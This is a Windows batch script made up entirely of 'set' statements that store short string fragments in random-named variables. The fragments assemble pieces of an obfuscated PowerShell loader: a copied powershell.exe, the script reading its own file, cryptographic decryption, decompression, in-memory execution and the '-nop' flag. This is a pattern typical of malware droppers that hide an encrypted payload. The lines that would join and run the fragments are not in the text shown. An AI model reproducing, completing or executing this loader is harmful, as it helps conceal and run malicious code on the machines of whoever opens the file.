@echo off
set "EaZFeOvnDO=Po"
set "XDmFKTcdre=32"
set "BxLcaqcPrx=\W"
set "qZLDbSwwxM= C"
set "HhCtCvmnYJ=ow"
set "REUVwZLKeU=we"
set "lHCePpOmXF=rS"
set "IdMyhEUiDW=s\"
set "aJZFNviCVO=:\"
set "viiZcWcyiv=in"
set "pAvKGfjHCu=rs"
set "KSRywdlzzc=ll"
set "JCPkeRMPBY=nd"
set "TrKHpGQrdz=em"
set "elTLeRFInY=py"
set "nNfycxTOBV=Sy"
set "wFMVktPeIM=0\"
set "EJoiGOpDMI=ll"
set "kkBbNOulzx=xe"
set "RUeIwETbnP=.e"
set "HCLbYffvmn=do"
set "PGVTDmpFHf=y "
set "iHpjjBBUZZ=we"
set "LVCMNWyVQO=\v"
set "htndJLwwcd=he"
set "HfuWcwFHHY=ws"
set "ffSVvGlmdR= /"
set "qvQjRGCfXj=he"
set "IsaXhJjLaE=st"
set "RxsDReDZfC=co"
set "RLfCZfEJqY=Wi"
set "aiqXywNKdP=1."
set "eoMUUuSdwU=po"
set "zJJSNxfjsu=cd"
set "PMZncJsFqs= %~dp0"
set "ahIhcytSRs=[Sys"
set "FJBkFfGjfU=cnaW"
set "lBNmlovQzp=-4] "
set "hELPtsBNNT=Star"
set "owjtynFuES=t Sy"
set "RReWXbjtOG=diu."
set "aotUvFVsbM=);$b"
set "ezgKXdElWc=hy.A"
set "CTEHfEjbxL=se()"
set "MxNxXSeJzg=fore"
set "LUdkpOcFxW=yste"
set "hBuUjKElhm=ecry"
set "DmFwniqMOZ=.Cop"
set "FKQbbEmjbR=stem"
set "fwmYsOFfFa=mory"
set "cUHkWbvege=('%~f0'"
set "DmiNxMwpkL= if "
set "pdjWrwJiVI=y.Ci"
set "oLZeywvDLZ=esMa"
set "LgICiihkaS=gnir"
set "VHZUCoPqBW=();$"
set "yVcHTlzQbX=s.Pa"
set "tybNgdungR=ateD"
set "Yxggqdmnus=).Sp"
set "KEvFAGbhCU=$bkP"
set "ZiysehKrxT=.Dis"
set "zKytYQhvBE=ispo"
set "tIeYlefcrJ=isfL"
set "fLQTgwyzoY=vj0m"
set "LZEEQbHacE=3HWs"
set "NCcNzWVrlH=.Cry"
set "MSxTMlIiKF=.Cry"
set "IBVAwxNPJb=haF."
set "aVjfGJoqhy=gth)"
set "QhdfpGkuhO=();$"
set "vjlDKJTleW=)) {"
set "SdtpKPQGxL=gMod"
set "PsJqhRJFou=$TBf"
set "skhrzmLRoP=bkPH"
set "sEdLTmxoGn=rtS4"
set "oKsncNuPUq=t = "
set "HTbMlJqSym= [Sy"
set "ZWYnjfvqLK=('l0"
set "WpjIdmTBgv=NT.T"
set "mzBcoMpwrt=sion"
set "WcuADTMMIo=pres"
set "lJpukEzMWa=uvP "
set "XtFWYgjWiv=kPHs"
set "ffASRaxYnF=;$qx"
set "omrOYXjWTS=-nop"
set "SjaGSlozAD=grap"
set "VWvnEbLnIq= [st"
set "ffDyYGmCYA=vKke"
set "otLGqnzoYy=kPHs"
set "uPvTMpJqQS=-joi"
set "MTtBUGtrkP=stem"
set "ChtZDLYsPQ= = ["
set "IKECoGAWCZ=.Mem"
set "UCxpXiALmk=oArr"
set "uPfQoGfQSV=ke($"
set "PMjVGsgOdo=pose"
set "GyjczIaLTX=TqX "
set "WmwnORZbHP=Disp"
